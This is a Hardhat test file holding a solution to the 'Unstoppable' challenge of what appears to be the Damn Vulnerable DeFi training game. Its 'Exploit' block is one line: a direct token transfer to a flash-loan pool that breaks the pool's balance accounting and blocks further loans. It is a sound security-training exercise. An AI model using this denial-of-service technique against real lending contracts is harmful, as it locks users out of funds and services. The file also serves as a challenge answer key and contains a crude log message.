const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        // gets the first 3 accounts from a local network, assigns them roles.
        [deployer, attacker, someUser] = await ethers.getSigners();

        // deploy the Token and Lender contracts using the deployer account, means the deployer has max
        // token balance and is the owner of the lending contract
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        // assign the token and pool to their respective contracts
        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        // approve a transfer from the token contract to the pools address for the amount that will be in
        // the pool, then send that amount to the pool
        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        await this.pool.depositTokens(TOKENS_IN_POOL);

        // send attacker his cut
        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        // test to make sure the pool has the right amount of tokens
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        // make sure attacker has right amount of tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
        this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
        await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
        // one line
        await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        // before
        // const Hack = await this.token.connect(attacker)
        // Hack.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE)
    });

    after(async function () {
        // Celebrate
        console.log("Nice Cock!");

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
